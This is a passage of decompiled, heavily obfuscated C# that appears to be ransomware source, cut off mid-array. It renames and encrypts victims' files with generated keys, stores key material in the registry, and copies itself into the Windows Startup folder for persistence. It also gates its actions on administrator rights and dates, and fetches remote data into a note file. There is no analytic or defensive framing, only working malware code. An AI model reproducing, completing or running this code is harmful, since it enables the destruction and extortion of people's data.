						if (QhxiUhpytB == getString_0(107396988) && new FileInfo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx).Length > Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024)
						{
							try
							{
								if (DAzuLkugKGvA != getString_0(107385707))
								{
									if (ftECRArlHKepq)
									{
										DAzuLkugKGvA = ITyFXeyNngsRQ + DAzuLkugKGvA;
									}
									File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA);
								}
							}
							catch (Exception ex2)
							{
								if (IxPlnZLdvsZB)
								{
									try
									{
										File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + getString_0(107411866) + ex2.Message + getString_0(107396508));
									}
									catch (Exception)
									{
									}
								}
								YQVkVIVGpFAMQ++;
								return;
							}
							if (DAzuLkugKGvA != getString_0(107385707))
							{
								CS_0024_003C_003E8__locals0.IZTAVYfIRdMx += DAzuLkugKGvA;
							}
							if (oaMCRFYrdbFfau == getString_0(107396988))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in WOAZqErHQpvAHsj)
									{
										if (CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.LrHzfRIVwfYz.DAzuLkugKGvA) && XvBfbWHuciprZZ == FXSsqhzMboXGq.getString_0(107396994))
										{
											if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx).Length)
											{
												try
												{
													hdkhpYUKtylncPr.xRNINHsHor(FXSsqhzMboXGq.getString_0(107389877), FXSsqhzMboXGq.getString_0(107389872), FXSsqhzMboXGq.getString_0(107389315), CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().EndsWith(item) && XvBfbWHuciprZZ == FXSsqhzMboXGq.getString_0(107396492))
										{
											try
											{
												hdkhpYUKtylncPr.xRNINHsHor(FXSsqhzMboXGq.getString_0(107389877), FXSsqhzMboXGq.getString_0(107389872), FXSsqhzMboXGq.getString_0(107389315), CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(CcZHpsCIoJG);
							if (LhIskusGNtqPC == getString_0(107396486))
							{
								byte[] array = null;
								byte[] byte_ = iQHvEzXEixXur.zQnYkaPtyUjj(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024);
								if (!iQHvEzXEixXur.yPLRgFIAPWTIT(hggTPAfoWyJLMW: (!oVxIyLzScyQqp) ? (YrjqOIvQHnLHl ? iQHvEzXEixXur.fYNdrMmszbFBKK(byte_, Convert.FromBase64String(ptbrIyAxDBqTL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : iQHvEzXEixXur.fYNdrMmszbFBKK(byte_, Convert.FromBase64String(ptbrIyAxDBqTL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (YrjqOIvQHnLHl ? qHHSaqSanlGZcJ.vHaUZnXLDnsvO(byte_, Convert.FromBase64String(ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk)) : qHHSaqSanlGZcJ.vHaUZnXLDnsvO(byte_, Convert.FromBase64String(ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk))), rGiQcJBSsDU: CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, LoTahZDxSK: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!YrjqOIvQHnLHl)
							{
								if (!IQGXzrSFQTv.lVXyHETerTvlQUP(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, KHcVbQthlIOKM, ptbrIyAxDBqTL, null, Convert.FromBase64String(MxPnNSnkNuk)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!IQGXzrSFQTv.lVXyHETerTvlQUP(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, KHcVbQthlIOKM, ptbrIyAxDBqTL, bytes, Convert.FromBase64String(MxPnNSnkNuk)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (ftECRArlHKepq)
							{
								DAzuLkugKGvA = ITyFXeyNngsRQ + DAzuLkugKGvA;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(CcZHpsCIoJG);
							if (DAzuLkugKGvA != getString_0(107385707))
							{
								if (!aYdUAapWGSeW)
								{
									if (!YrjqOIvQHnLHl)
									{
										VzUXnxrRrdNjo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA, NLiEmQZDarX);
									}
									else
									{
										VzUXnxrRrdNjo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA, Convert.FromBase64String(ptbrIyAxDBqTL));
									}
								}
								else
								{
									try
									{
										if (!YrjqOIvQHnLHl)
										{
											KaQFQiQUZOvLzjc(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA, NLiEmQZDarX, Convert.FromBase64String(MxPnNSnkNuk));
										}
										else
										{
											KaQFQiQUZOvLzjc(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA, Convert.FromBase64String(ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk));
										}
									}
									catch (Exception ex2)
									{
										if (IxPlnZLdvsZB)
										{
											try
											{
												File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + getString_0(107385661) + ex2.Message + getString_0(107396508));
											}
											catch (Exception)
											{
											}
										}
										YQVkVIVGpFAMQ++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!aYdUAapWGSeW)
							{
								if (!YrjqOIvQHnLHl)
								{
									VzUXnxrRrdNjo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + getString_0(107385702), NLiEmQZDarX);
								}
								else
								{
									VzUXnxrRrdNjo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + getString_0(107385702), Convert.FromBase64String(ptbrIyAxDBqTL));
								}
							}
							else
							{
								try
								{
									if (!YrjqOIvQHnLHl)
									{
										KaQFQiQUZOvLzjc(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, NLiEmQZDarX, Convert.FromBase64String(MxPnNSnkNuk));
									}
									else
									{
										KaQFQiQUZOvLzjc(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, Convert.FromBase64String(ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk));
									}
								}
								catch (Exception ex2)
								{
									if (IxPlnZLdvsZB)
									{
										try
										{
											File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + getString_0(107385661) + ex2.Message + getString_0(107396508));
										}
										catch (Exception)
										{
										}
									}
									YQVkVIVGpFAMQ++;
									return;
								}
							}
							if (YrjqOIvQHnLHl)
							{
								if (DAzuLkugKGvA != getString_0(107385707))
								{
									cPkfysCcaOIXirBU(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + DAzuLkugKGvA, bytes);
								}
								else
								{
									cPkfysCcaOIXirBU(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, bytes);
								}
							}
						}
						end_IL_0874:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_102b;
			IL_102b:
			ZIfnfpwnJXQh.Remove(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
		}

		static TVOFMeqqDEgV()
		{
			Strings.CreateGetStringDelegate(typeof(TVOFMeqqDEgV));
		}
	}

	private sealed class kLpGSGMZUAukasnx
	{
		public string eAApvYWrRc;

		public string ozpNWwBFrGtY;

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					File.Delete(eAApvYWrRc);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__46()
		{
			while (true)
			{
				try
				{
					if (File.Exists(ozpNWwBFrGtY))
					{
						File.Delete(ozpNWwBFrGtY);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string XQBvVaBiYNtbTGQ;

	public static byte[] NLiEmQZDarX;

	public static string eaVwpFidBvEVE;

	public static string bpXPuDgesBNQk;

	public static List<string> ErNGCzDqbgJcNq;

	public static List<string> FEyXLHljGVb;

	public static string rnCYEPnajebIl;

	public static string ptbrIyAxDBqTL;

	public static string MxPnNSnkNuk;

	public static string CcZHpsCIoJG;

	public static string mOUSujsRKqplh;

	public static int BQnkHErquGiOdm;

	public static string tFYBgTlzqriJCl;

	public static string cxPNZAQFWJPJy;

	public static string vzcriJeQmyz;

	public static string xELZNLRmENNyZ;

	public static string kqQXtlPdyZIta;

	public static string zFfyXyoQvalL;

	public static string qvMgChtEAZLg;

	public static string OMtKsvaQdirySzwjg;

	public static List<string> yqZYLXbivBjkb;

	public static List<string> AVcTEbDnEiIrK;

	public static string qBlIlUrBcLeqW;

	public static string pbIpERIRkl;

	public static string AOMaLufrZchMC;

	public static List<string> mOohEoBvvwIsCph;

	public static string NqxhHNylXDzJMss;

	private static string pBLfmQvNDQLAtEZlD;

	public static string dWQLbOGxxGUm;

	public static string xiGnCMeIjTYAmwP;

	public static List<string> KqSlrFXjTdVr;

	public static List<string> kMlHmqLOtrVRDv;

	public static List<string> AUaPVUwjLyfdAW;

	public static string yhzLVMUnRzyNJL;

	public static List<string> yZGtRUXyYPE;

	public static List<string> imORVFuEji;

	public static string FaZaotFvYkeG;

	public static string NrzxQagFmfLz;

	internal static DateTime AHawKajwZkwOUCb;

	internal static DateTime UgctjaZsMMy;

	public static string QhxiUhpytB;

	public static string KHcVbQthlIOKM;

	public static string ZXoHndgsjM;

	public static string JDhxrqdOrRrI;

	public static string zbWMLuuocgT;

	public static string RdvsLzXZvbqcn;

	public static string OluHGjurQVbXs;

	public static string oaMCRFYrdbFfau;

	public static List<string> WOAZqErHQpvAHsj;

	public static string XvBfbWHuciprZZ;

	public static string cfZDnOvovZah;

	public static string gcostyhfeUvsHC;

	public static string UHWPXSoPUMg;

	public static string PBSVsTvpkrUe;

	public static string EpCsDxtJYsZGzw;

	public static string dIyPcHMpaUp;

	public static string JWeCzmkXGapsEO;

	public static string cHlMXqrlaqguL;

	public static string mSrKrgVcQPqlFZ;

	public static string JlvCoFbKLcBH;

	public static string zhAZxZZxAfXTcT;

	public static string YwMZGWWwwR;

	public static string fWdwNKveSnXZw;

	public static string RzqCCCsKOn;

	public static string NhynxdjaLBv;

	public static string JdraEdbLNwPZxsL;

	public static string KFBJsFTZQCtYi;

	public static string fXpSSYeekBJZJE;

	public static string dkWBHAPryK;

	public static string faWRRnNYaT;

	public static string EfiHSAKjAHyl;

	public static string SnXfyvTxvoJ;

	public static string gQGxNFPuSnfa;

	public static string cPaKpWJfcXNc;

	public static string vksVCeVTJovM;

	public static string LhIskusGNtqPC;

	public static string fYklMiPjwvEMMM;

	public static string DlnPdlTNOzZKWXo;

	public static string[] iMIFZZADTYmjt;

	public static string NrRjEEeptLvAPsW;

	public static bool oVxIyLzScyQqp;

	public static string hbPuJuPPGYgMOGV;

	public static bool YrjqOIvQHnLHl;

	public static bool PDbIQyycteW;

	public static bool MnUmMqCrYFJvnIK;

	public static bool ugqwmwtvqbFo;

	public static string AJzDKHoaGNRf;

	public static bool IxPlnZLdvsZB;

	public static bool MaALatKWWDkon;

	public static bool wtSBZSBblNtap;

	public static bool EjCdzBangCjgRE;

	public static bool aYdUAapWGSeW;

	public static string THXwmzLnrqe;

	public static bool DHKhstFrxWX;

	public static Stopwatch VdNQzJyOFXqjq;

	public static int YQVkVIVGpFAMQ;

	public static int emFRwwndTZvr;

	public static bool ftECRArlHKepq;

	public static string ITyFXeyNngsRQ;

	public static string[] DXLtZmyxCdw;

	public static List<string> ASvnhkEKlK;

	public static int MpJOfNTSgoM;

	public static bool FLrXpcNUru;

	public static bool lNurPNsNYgGP;

	public static bool DOtLkCUQkgViIsPR;

	public static bool zmkyOqtOWhAMq;

	public static bool lbKtRvXlZTmt;

	public static bool ftzzNtuKSF;

	public static List<string> clyvuVTVcB;

	public static string CfFFFjArTGyB;

	public static bool WXjJcHajhkaSgC;

	public static List<string> zwcghQHXyETN;

	public static List<string> VWzCYYzaUNuJetkL;

	public static List<string> SznCfFdSth;

	public static byte[] BnuxWErzUCfnEIqmIn;

	public static byte[] MiJCtYUbAiLcWGEoBU;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		try
		{
			VNHWFfxrkn CS_0024_003C_003E8__locals0 = new VNHWFfxrkn();
			CS_0024_003C_003E8__locals0.uapbUsgPXHabL = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.uapbUsgPXHabL) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			FgAqnIiYnse.qQtEXlRJmBgw(pBLfmQvNDQLAtEZlD);
		}
		catch (Exception)
		{
		}
		try
		{
			if (vksVCeVTJovM == getString_0(107396968))
			{
				Thread thread = new Thread(CtQRStmWZuCRIg.FlzaIBcjquRJDaG);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (vzcriJeQmyz == getString_0(107396968))
		{
			Thread.Sleep(int.Parse(xELZNLRmENNyZ));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && OluHGjurQVbXs == getString_0(107396968))
		{
			try
			{
				seeqzwHruqoL(EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107396963))));
			}
			catch
			{
			}
		}
		try
		{
			if (qvMgChtEAZLg == getString_0(107396968) && DOfjurMGFlyB.OmyJRvqpOhcqON())
			{
				new IuTSWrvWgWQjhKXa().xlcMfXwCEmZ(bool_0: false);
				DOfjurMGFlyB.gzvNBrFgINrEkz();
			}
		}
		catch (Exception)
		{
		}
		if (pbIpERIRkl == getString_0(107396968) && DOfjurMGFlyB.OmyJRvqpOhcqON())
		{
			new IuTSWrvWgWQjhKXa().xlcMfXwCEmZ(bool_0: false);
			new IuTSWrvWgWQjhKXa().NQiQaABzEuWeZV();
		}
		if (cxPNZAQFWJPJy == getString_0(107396968))
		{
			RtCOkjvyjUFu.bBkxZKYMjmduR();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396890);
			string text2 = text + Path.GetFileName(fileName);
			if (mOUSujsRKqplh == getString_0(107396968) && fileName != text2)
			{
				Thread thread2 = new Thread(OgMztxkLImS);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (rnCYEPnajebIl == getString_0(107396968) && mainModule != null && fileName != text2)
			{
				try
				{
					BQnkHErquGiOdm = bBEUkiWblfEQ(0, yqZYLXbivBjkb.Count);
					File.Copy(fileName, text + yqZYLXbivBjkb[BQnkHErquGiOdm], overwrite: true);
					getString_0(107396885);
					Process.Start(text + yqZYLXbivBjkb[BQnkHErquGiOdm]);
					VActiygTXQaRxCgZR();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (FaZaotFvYkeG == getString_0(107396968) && DateTime.Now < AHawKajwZkwOUCb)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (NrzxQagFmfLz == getString_0(107396968) && DateTime.Now > UgctjaZsMMy)
			{
				VActiygTXQaRxCgZR();
			}
		}
		catch
		{
		}
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> kqSlrFXjTdVr = KqSlrFXjTdVr;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385620)), string_0);
					};
				}
				Parallel.ForEach(kqSlrFXjTdVr, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> source = kMlHmqLOtrVRDv;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385575)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (DlnPdlTNOzZKWXo == getString_0(107396968))
				{
					string[] source2 = iMIFZZADTYmjt;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385575)), getString_0(107385582) + string_0 + getString_0(107385541));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!KcMNmzTKVuN().Contains(getString_0(107386280)))
				{
					fTntuKaZyTzi(yhzLVMUnRzyNJL);
				}
				else
				{
					List<string> aUaPVUwjLyfdAW = AUaPVUwjLyfdAW;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							QKkRdHWXNelGs(EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107385536))), string_0);
						};
					}
					Parallel.ForEach(aUaPVUwjLyfdAW, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source3 = yZGtRUXyYPE;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385511)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			if (!ErNGCzDqbgJcNq.Contains(currentDirectory))
			{
				ErNGCzDqbgJcNq.Add(currentDirectory);
			}
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397139))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397139)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397090)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !ErNGCzDqbgJcNq.Contains(text6) && text6 != getString_0(107397101) && text6 != getString_0(107397080) && text6 != getString_0(107397027))
								{
									ErNGCzDqbgJcNq.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396998)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && text6 != getString_0(107397101) && text6 != getString_0(107397080) && text6 != getString_0(107397027))
								{
									clyvuVTVcB.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397009)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396452))
						{
							YwMZGWWwwR = getString_0(107396968);
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396475))
						{
							YwMZGWWwwR = getString_0(107396466);
						}
					}
					if (text3.Contains(getString_0(107396461)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396452))
						{
							DHKhstFrxWX = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396475))
						{
							DHKhstFrxWX = false;
						}
					}
					if (text3.Contains(getString_0(107396412)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396452))
						{
							IxPlnZLdvsZB = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396475))
						{
							IxPlnZLdvsZB = false;
						}
					}
					if (text3.Contains(getString_0(107396431)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396452))
						{
							FLrXpcNUru = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396475))
						{
							FLrXpcNUru = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(AJzDKHoaGNRf, getString_0(107396402) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (YwMZGWWwwR == getString_0(107396466))
		{
			IocdDhlhIU();
		}
		if (lNurPNsNYgGP)
		{
			try
			{
				Console.WriteLine(getString_0(107396325));
				gqyaEOSxsXzEwLTJ.TvqDlBRUBF();
			}
			catch (Exception ex6)
			{
				if (IxPlnZLdvsZB)
				{
					try
					{
						File.AppendAllText(AJzDKHoaGNRf, getString_0(107396304) + ex6.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (YwMZGWWwwR == getString_0(107396968))
		{
			try
			{
				IRmkEZyqQsswghf();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && MnUmMqCrYFJvnIK)
			{
				try
				{
					Thread thread4 = new Thread(OXcMFdshPo.lJiGxtXvuzRnxUQl);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			QKkRdHWXNelGs(getString_0(107396227), EvKBdYIakj(getString_0(107396246)));
		}
		if (qBlIlUrBcLeqW == getString_0(107396968) && umEiRysrNTJU() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(coBWxmnoGcnU.pcFKJWPqNqp);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		if (!(xiGnCMeIjTYAmwP == getString_0(107396968)))
		{
		}
		SecureString secureString = new SecureString();
		if (ZXoHndgsjM == getString_0(107396466))
		{
			if (!WXjJcHajhkaSgC)
			{
				ptbrIyAxDBqTL = xOLdYONpbhA.aIfVeJYRUUj(32);
				MxPnNSnkNuk = xOLdYONpbhA.NCcryFGogVGp();
			}
		}
		else
		{
			ptbrIyAxDBqTL = getString_0(107396685);
		}
		if (!WXjJcHajhkaSgC)
		{
			CcZHpsCIoJG = IStdKCxduDkDv.lLnKSAYKNyeo(ptbrIyAxDBqTL + MxPnNSnkNuk);
		}
		else
		{
			try
			{
				UfpnqbeKARXf();
				ptbrIyAxDBqTL = NQBhurDSLvxN(wQSWiHcHbGYcGyy(MiJCtYUbAiLcWGEoBU, QCahVTqcPhNK(CfFFFjArTGyB)));
				MiJCtYUbAiLcWGEoBU = null;
				MxPnNSnkNuk = NQBhurDSLvxN(new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
				CcZHpsCIoJG = NQBhurDSLvxN(BnuxWErzUCfnEIqmIn);
			}
			catch (Exception)
			{
				WXjJcHajhkaSgC = false;
				ptbrIyAxDBqTL = xOLdYONpbhA.aIfVeJYRUUj(32);
				MxPnNSnkNuk = xOLdYONpbhA.NCcryFGogVGp();
				CcZHpsCIoJG = IStdKCxduDkDv.lLnKSAYKNyeo(ptbrIyAxDBqTL + MxPnNSnkNuk);
			}
		}
		try
		{
			if (!YrjqOIvQHnLHl)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(EvKBdYIakj(getString_0(107396608)));
				if (registryKey != null)
				{
					registryKey.SetValue(EvKBdYIakj(getString_0(107396595)) + (registryKey.ValueCount + 1), CcZHpsCIoJG);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(EvKBdYIakj(getString_0(107396608)));
				if (registryKey != null && registryKey.ValueCount == 0)
				{
					registryKey.SetValue(EvKBdYIakj(getString_0(107396595)) + (registryKey.ValueCount + 1), CcZHpsCIoJG);
					registryKey.Close();
				}
				else if (registryKey != null && registryKey.ValueCount != 0)
				{
					registryKey.Close();
				}
			}
		}
		catch (Exception)
		{
			lbKtRvXlZTmt = true;
		}
		if (JWeCzmkXGapsEO == getString_0(107396968))
		{
			ZOXXLkeBEtSTsEu();
		}
		if (wtSBZSBblNtap)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), THXwmzLnrqe)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), THXwmzLnrqe), string.Concat(EvKBdYIakj(getString_0(107396554)), new WebClient().DownloadString(EvKBdYIakj(getString_0(107396561))), getString_0(107396488), EvKBdYIakj(getString_0(107396483)), DateTime.Now, getString_0(107396488), EvKBdYIakj(getString_0(107395962)), CcZHpsCIoJG));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), THXwmzLnrqe), getString_0(107395873) + CcZHpsCIoJG);
				}
			}
			catch (Exception ex12)
			{
				if (IxPlnZLdvsZB)
				{
					try
					{
						File.AppendAllText(AJzDKHoaGNRf, getString_0(107395844) + ex12.Message + getString_0(107396488));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!zmkyOqtOWhAMq || lbKtRvXlZTmt)
		{
			aQcWLAvevwFC.tnfPMikriJIhA(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), dkWBHAPryK), FSVYPpmyFDpXB(CcZHpsCIoJG), null, null, getString_0(107395827), getString_0(107395778), null);
		}
		try
		{
			try
			{
				if (DHKhstFrxWX)
				{
					Console.WriteLine(getString_0(107395793));
				}
			}
			catch
			{
			}
			ACRAsVfQtQu(new string[1] { getString_0(107395712) }, new string[100]
			{
				getString_0(107395735),
				getString_0(107395730),
				getString_0(107395725),
				getString_0(107396196),
				getString_0(107396191),
				getString_0(107396218),
				getString_0(107396213),
				getString_0(107396208),
				getString_0(107396171),
				getString_0(107396166),
				getString_0(107396161),
				getString_0(107396156),
				getString_0(107396179),
				getString_0(107396174),
				getString_0(107396133),
				getString_0(107396128),
				getString_0(107396155),
				getString_0(107396150),
				getString_0(107396145),
				getString_0(107396140),
				getString_0(107396099),
				getString_0(107396094),
				getString_0(107396121),
				getString_0(107396116),
				getString_0(107396111),
				getString_0(107396074),
				getString_0(107396069),
				getString_0(107396064),
				getString_0(107396091),
				getString_0(107396086),
				getString_0(107396081),
				getString_0(107396076),
				getString_0(107396039),
				getString_0(107396034),
				getString_0(107396057),
				getString_0(107396052),
				getString_0(107396047),
